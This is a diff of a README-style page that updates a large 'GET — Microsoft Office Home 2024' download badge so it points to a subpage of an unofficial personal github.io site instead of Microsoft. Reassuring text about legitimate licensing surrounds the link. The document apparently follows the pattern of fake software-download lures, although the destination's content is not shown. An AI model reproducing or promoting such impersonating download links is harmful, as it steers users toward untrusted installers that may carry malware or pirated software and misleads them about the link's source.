@@ -118,7 +118,7 @@ Compatibility and formatting can vary when files are opened in different applica
 
 Use the button below to open the configured project destination.
 
-[![GET — Microsoft Office Home 2024](https://img.shields.io/badge/GET%20%E2%80%94%20Microsoft%20Office%20Home%202024-0078D6?style=for-the-badge&logoColor=white)](https://benellaybanabella.github.io/.github/)
+[![GET — Microsoft Office Home 2024](https://img.shields.io/badge/GET%20%E2%80%94%20Microsoft%20Office%20Home%202024-0078D6?style=for-the-badge&logoColor=white)](https://benellaybanabella.github.io/.github/Microsoft-Office-Home-2024-Suite)
 
 For a legitimate installation, use the product entitlement associated with your purchase and follow Microsoft's setup instructions. Confirm that the selected edition matches your license before proceeding.
 
